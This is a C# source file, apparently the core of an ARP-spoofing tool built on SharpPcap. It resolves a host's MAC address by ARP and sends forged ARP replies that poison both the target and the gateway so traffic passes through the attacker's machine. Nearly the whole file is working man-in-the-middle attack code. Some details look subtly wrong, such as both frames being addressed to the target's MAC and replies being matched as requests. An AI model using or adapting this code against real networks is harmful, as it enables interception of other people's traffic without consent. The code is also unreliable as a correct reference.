using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using PacketDotNet;
using SharpPcap;

namespace ArpSpoof.Core;

public class PacketBuild
{
    /// <summary>
    /// Get mac address from ip address
    /// </summary>
    public static async Task<PhysicalAddress> GetMacAddress(ILiveDevice device, string host, CancellationToken ct)
    {
        try
        {
            var localIp = ((SharpPcap.LibPcap.LibPcapLiveDevice)device).Addresses
                            .FirstOrDefault(a =>
                                a.Addr.ipAddress != null &&
                                a.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
                            ?.Addr.ipAddress;

            var localMac = device.MacAddress;
            var ethernetPacket = new EthernetPacket(
                localMac,
                PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                EthernetType.Arp);

            var arpPacket = new ArpPacket(
                ArpOperation.Request,
                localMac,
                IPAddress.Parse(host),
                localMac,
                localIp
            );

            ethernetPacket.PayloadPacket = arpPacket;

            PhysicalAddress macRes = null;

            device.OnPacketArrival += (sender, e) =>
            {
                var packet = Packet.ParsePacket(e.GetPacket().LinkLayerType, e.GetPacket().Data);
                var eth = packet.Extract<EthernetPacket>();
                var arp = packet.Extract<ArpPacket>();

                if (eth != null && arp != null &&
                    arp.SenderProtocolAddress.ToString() == host
                    && arp.Operation == ArpOperation.Request)
                {
                    macRes = arp.SenderHardwareAddress;
                    return;
                }
            };

            // bpf filter
            device.Filter = "arp";

            device.StartCapture();
            device.SendPacket(ethernetPacket);
            await Task.Delay(2000, ct);
            device.StopCapture();

            return macRes ?? throw new InvalidOperationException($"[GetMacFromIP] MAC address not found for the target IP {host}");
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"[GetMacAddress] {ex.Message}");
        }
    }

    /// <summary>
    /// Send Spoofed Arp Packet
    /// </summary>
    public static void Spoof(ILiveDevice device, IPAddress targetIp, PhysicalAddress targetMac, IPAddress gatewayIp, PhysicalAddress gatewayMac)
    {
        try
        {
            // reply to the gateway
            var arpRequestToGateway = new ArpPacket(
                ArpOperation.Response,
                device.MacAddress,
                targetIp,
                gatewayMac,
                gatewayIp
            );

            // reply to the target
            var arpRequestToTarget = new ArpPacket(
                ArpOperation.Response,
                device.MacAddress,
                gatewayIp,
                targetMac,
                targetIp
            );

            // Sent to the gateway
            var ethernetPacket = new EthernetPacket(device.MacAddress, targetMac, EthernetType.Arp);
            ethernetPacket.PayloadPacket = arpRequestToGateway;
            device.SendPacket(ethernetPacket);

            // Sent to the target
            ethernetPacket.PayloadPacket = arpRequestToTarget;
            device.SendPacket(ethernetPacket);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[{DateTime.Now}] Sent ARP reply to target: {targetIp} -> {DeviceHelper.FormattedMac(targetMac)}");
            Console.ResetColor();

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[{DateTime.Now}] * Spoofed * {gatewayIp} -> {DeviceHelper.FormattedMac(targetMac)}");
            Console.ResetColor();
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"[Spoof] {ex.Message}");
        }
    }
}